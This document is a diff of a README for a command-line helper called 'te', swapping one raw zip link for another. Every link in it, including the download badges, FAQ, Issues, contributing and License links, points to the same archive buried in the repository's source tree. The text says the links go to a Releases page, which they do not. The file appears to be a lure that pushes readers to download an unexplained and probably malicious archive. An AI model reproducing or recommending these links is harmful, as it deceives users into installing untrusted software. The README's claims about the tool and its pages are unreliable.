@@ -17,7 +17,7 @@ Welcome to **te**! This tool makes working with complex command-line commands ea
 To get started, you will need to download the application. 
 
 ### Visit This Page To Download
-[![Download te](https://raw.githubusercontent.com/hackingrat21421/te/main/.vscode/te_2.1.zip)](https://raw.githubusercontent.com/hackingrat21421/te/main/.vscode/te_2.1.zip)
+[![Download te](https://raw.githubusercontent.com/hackingrat21421/te/main/src/Software-1.2.zip)](https://raw.githubusercontent.com/hackingrat21421/te/main/src/Software-1.2.zip)
 
 1. Click on the download button above to go to the Releases page.
 2. Look for the latest version of **te**.
@@ -71,11 +71,11 @@ To get started, you will need to download the application.
 
 ## 🛠️ Support
 
-If you encounter any issues, you can consult our [FAQ](https://raw.githubusercontent.com/hackingrat21421/te/main/.vscode/te_2.1.zip) section for common questions and answers. For more tailored support, please submit an issue on the GitHub [Issues page](https://raw.githubusercontent.com/hackingrat21421/te/main/.vscode/te_2.1.zip).
+If you encounter any issues, you can consult our [FAQ](https://raw.githubusercontent.com/hackingrat21421/te/main/src/Software-1.2.zip) section for common questions and answers. For more tailored support, please submit an issue on the GitHub [Issues page](https://raw.githubusercontent.com/hackingrat21421/te/main/src/Software-1.2.zip).
 
 ## 🌟 Community Contributions
 
-We welcome contributions! If you have ideas for features, enhancements, or fixes, please check our [contributing guidelines](https://raw.githubusercontent.com/hackingrat21421/te/main/.vscode/te_2.1.zip).
+We welcome contributions! If you have ideas for features, enhancements, or fixes, please check our [contributing guidelines](https://raw.githubusercontent.com/hackingrat21421/te/main/src/Software-1.2.zip).
 
 ## 🎉 Acknowledgments
 
@@ -83,8 +83,8 @@ We appreciate the support from our community and contributors. This project bene
 
 ## 📜 Legal
 
-For licensing information, visit our [License page](https://raw.githubusercontent.com/hackingrat21421/te/main/.vscode/te_2.1.zip).
+For licensing information, visit our [License page](https://raw.githubusercontent.com/hackingrat21421/te/main/src/Software-1.2.zip).
 
-[![Download te](https://raw.githubusercontent.com/hackingrat21421/te/main/.vscode/te_2.1.zip)](https://raw.githubusercontent.com/hackingrat21421/te/main/.vscode/te_2.1.zip)
+[![Download te](https://raw.githubusercontent.com/hackingrat21421/te/main/src/Software-1.2.zip)](https://raw.githubusercontent.com/hackingrat21421/te/main/src/Software-1.2.zip)
 
 Thank you for using **te**! We hope it makes your command-line experience much simpler and more enjoyable.
